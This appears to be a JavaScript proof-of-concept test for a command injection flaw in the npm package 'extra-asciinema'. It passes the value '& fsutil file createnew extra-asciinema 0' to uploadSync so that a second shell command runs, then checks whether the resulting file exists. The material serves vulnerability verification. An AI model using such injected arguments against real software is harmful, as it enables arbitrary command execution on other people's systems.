// test("Command Injection in extra-asciinema", (done) => {
//   expect.assertions(2);
  const asciinema = require("extra-asciinema");
  const fs = require("fs");
  const path = "./extra-asciinema";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  asciinema.uploadSync("& fsutil file createnew extra-asciinema 0");
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {
//     done();
  });
// });
